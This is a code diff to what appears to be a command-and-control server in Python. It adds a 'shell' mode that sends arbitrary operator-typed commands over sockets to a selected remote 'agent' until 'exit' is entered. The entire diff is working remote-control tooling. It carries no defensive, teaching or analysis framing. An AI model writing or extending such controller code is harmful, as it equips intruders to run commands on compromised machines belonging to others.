@@ -77,6 +77,18 @@ class Server:
             elif command.startswith("agent "):
                 self.current_session = int(command.replace("agent ",''))
 
+            elif command == "shell":
+                agent = self.agents[self.current_session - 1] 
+                if self.current_session > 0:
+                    agent.sock.send(f"shell".encode())
+                    while True:
+                        command = input('$> ')
+                        if command.lower() == 'exit':
+                            agent.sock.send(b'exit\n')
+                            break
+                        agent.sock.send(command.encode() + b'\n')
+                        
+
             elif command.startswith("send"):
                 if self.current_session > 0:
                     self.agents[self.current_session - 1].sock.send(f"{command.replace('send ','')}\n".encode())
